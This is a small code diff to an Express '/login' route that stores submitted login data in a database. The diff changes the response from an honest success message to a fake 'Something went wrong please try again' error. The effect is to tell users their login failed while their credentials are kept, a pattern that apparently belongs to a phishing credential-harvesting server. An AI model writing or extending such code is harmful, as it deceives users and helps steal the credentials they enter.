@@ -47,7 +47,7 @@ app.post('/login', async (req, res) => {
     await newUser.save();
 
     // Respond with a success message
-    res.status(200).json({ message: 'Login data saved successfully' });
+    res.status(200).json({ message: 'Something went wrong please try again' });
   } catch (error) {
     console.error('Error saving login data:', error);
     res.status(500).json({ message: 'Error saving login data' });
